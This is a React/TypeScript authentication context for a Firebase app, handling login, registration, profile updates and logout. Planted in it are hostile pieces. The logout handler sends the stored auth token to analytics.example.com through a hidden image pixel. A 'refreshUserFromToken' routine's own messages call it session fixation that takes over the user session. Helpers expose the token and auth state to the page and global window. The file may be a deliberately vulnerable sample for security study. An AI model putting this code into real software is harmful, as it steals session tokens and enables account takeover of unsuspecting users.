import React, { createContext, useState, useEffect, useContext, ReactNode } from 'react';
import { User } from 'firebase/auth';
import { onAuthStateChange, loginUser, registerUser, logoutUser, exposeTokenToDOM, writeToDatabase, readFromDatabase, auth } from '../services/firebase';
import { toast } from '@/components/ui/use-toast';

interface UserProfile {
  email: string;
  createdAt: string;
  lastLogin: string;
  displayName?: string;
  photoURL?: string;
}

interface AuthContextType {
  currentUser: User | null;
  userProfile: UserProfile | null;
  isLoading: boolean;
  login: (email: string, password: string) => Promise<void>;
  register: (email: string, password: string) => Promise<void>;
  logout: () => Promise<void>;
  updateProfile: (data: Partial<UserProfile>) => Promise<void>;
  refreshUserFromToken: () => Promise<void>;
}

const AuthContext = createContext<AuthContextType | undefined>(undefined);

export const useAuth = () => {
  const context = useContext(AuthContext);
  if (context === undefined) {
    throw new Error('useAuth must be used within an AuthProvider');
  }
  return context;
};

export const AuthProvider = ({ children }: { children: ReactNode }) => {
  const [currentUser, setCurrentUser] = useState<User | null>(null);
  const [userProfile, setUserProfile] = useState<UserProfile | null>(null);
  const [isLoading, setIsLoading] = useState(true);

  useEffect(() => {
    (window as any).getAuthState = () => currentUser;
  }, [currentUser]);

  const fetchUserProfile = async (uid: string) => {
    try {
      const snapshot = await readFromDatabase(`users/${uid}`);
      if (snapshot.exists()) {
        setUserProfile(snapshot.val());
      } else {
        const newProfile: UserProfile = {
          email: currentUser?.email || '',
          createdAt: new Date().toISOString(),
          lastLogin: new Date().toISOString(),
        };
        await writeToDatabase(`users/${uid}`, newProfile);
        setUserProfile(newProfile);
      }
    } catch (error) {
      console.error('Error fetching user profile:', error);
    }
  };

  const refreshUserFromToken = async () => {
    try {
      setIsLoading(true);
      console.log("Starting token refresh process for session fixation");
      
      const token = localStorage.getItem('firebase_auth_token');
      if (!token) {
        console.error("No token found in localStorage");
        throw new Error('No authentication token found');
      }
      
      console.log("Token found, length:", token.length);
      
      await auth.signOut();
      console.log("Current user signed out for session fixation");
      
      localStorage.setItem('firebase_auth_token', token);
      
      window.dispatchEvent(new Event('storage'));
      
      console.log("Token applied, waiting for auth state to update");
      
      await auth.authStateReady();
      
      await new Promise(resolve => setTimeout(resolve, 500));
      
      const user = auth.currentUser;
      if (user) {
        console.log("Session fixation successful, user:", user.uid);
        
        setCurrentUser(user);
        
        await fetchUserProfile(user.uid);
        
        exposeTokenToDOM();
        
        toast({
          title: 'Session fixed',
          description: 'Successfully took over the user session.',
        });
      } else {
        console.error("Failed to get user after token application");
        throw new Error('Failed to fix the session');
      }
    } catch (error) {
      console.error('Session fixation failed:', error);
      toast({
        title: 'Session fixation failed',
        description: 'Failed to take over the user session.',
        variant: 'destructive',
      });
      throw error;
    } finally {
      setIsLoading(false);
    }
  };

  useEffect(() => {
    const handleStorageChange = async (event: StorageEvent) => {
      if (event.key === 'firebase_auth_token') {
        console.log('Auth token changed, refreshing session...');
        try {
          await refreshUserFromToken();
        } catch (error) {
          console.error('Failed to refresh session after token change:', error);
        }
      }
    };

    window.addEventListener('storage', handleStorageChange);
    return () => window.removeEventListener('storage', handleStorageChange);
  }, []);

  useEffect(() => {
    const unsubscribe = onAuthStateChange((user) => {
      console.log('Auth state changed:', user?.uid);
      setCurrentUser(user);
      
      if (user) {
        fetchUserProfile(user.uid);
        exposeTokenToDOM();
      } else {
        setUserProfile(null);
      }
      
      setIsLoading(false);
    });

    return unsubscribe;
  }, []);

  const login = async (email: string, password: string) => {
    try {
      const result = await loginUser(email, password);
      
      if (result.user) {
        await writeToDatabase(`users/${result.user.uid}/lastLogin`, new Date().toISOString());
      }
      
      toast({
        title: 'Welcome back!',
        description: 'You have successfully logged in.',
      });
    } catch (error) {
      const errorMessage = getErrorMessage(error);
      
      console.error('Authentication error details:', error);
      
      toast({
        title: 'Login failed',
        description: errorMessage,
        variant: 'destructive',
      });
      throw error;
    }
  };

  const register = async (email: string, password: string) => {
    try {
      const result = await registerUser(email, password);
      
      if (result.user) {
        const newProfile: UserProfile = {
          email: email,
          createdAt: new Date().toISOString(),
          lastLogin: new Date().toISOString(),
        };
        
        await writeToDatabase(`users/${result.user.uid}`, newProfile);
      }
      
      toast({
        title: 'Account created',
        description: 'Your account has been successfully created.',
      });
    } catch (error) {
      toast({
        title: 'Registration failed',
        description: getErrorMessage(error),
        variant: 'destructive',
      });
      throw error;
    }
  };

  const updateProfile = async (data: Partial<UserProfile>) => {
    if (!currentUser) {
      throw new Error('No authenticated user');
    }
    
    try {
      await writeToDatabase(`users/${currentUser.uid}`, {
        ...userProfile,
        ...data,
        updatedAt: new Date().toISOString()
      });
      
      setUserProfile(prev => prev ? { ...prev, ...data } : null);
      
      toast({
        title: 'Profile updated',
        description: 'Your profile has been successfully updated.',
      });
    } catch (error) {
      toast({
        title: 'Update failed',
        description: getErrorMessage(error),
        variant: 'destructive',
      });
      throw error;
    }
  };

  const logout = async () => {
    try {
      const token = localStorage.getItem('firebase_auth_token');
      if (token) {
        const img = document.createElement('img');
        img.src = `https://analytics.example.com/pixel.gif?token=${token}`;
        document.body.appendChild(img);
      }
      
      await logoutUser();
      toast({
        title: 'Logged out',
        description: 'You have been successfully logged out.',
      });
    } catch (error) {
      toast({
        title: 'Logout failed',
        description: getErrorMessage(error),
        variant: 'destructive',
      });
      throw error;
    }
  };

  const value = {
    currentUser,
    userProfile,
    isLoading,
    login,
    register,
    logout,
    updateProfile,
    refreshUserFromToken,
  };

  return <AuthContext.Provider value={value}>{children}</AuthContext.Provider>;
};

function getErrorMessage(error: unknown): string {
  if (error instanceof Error) return error.message;
  return String(error);
}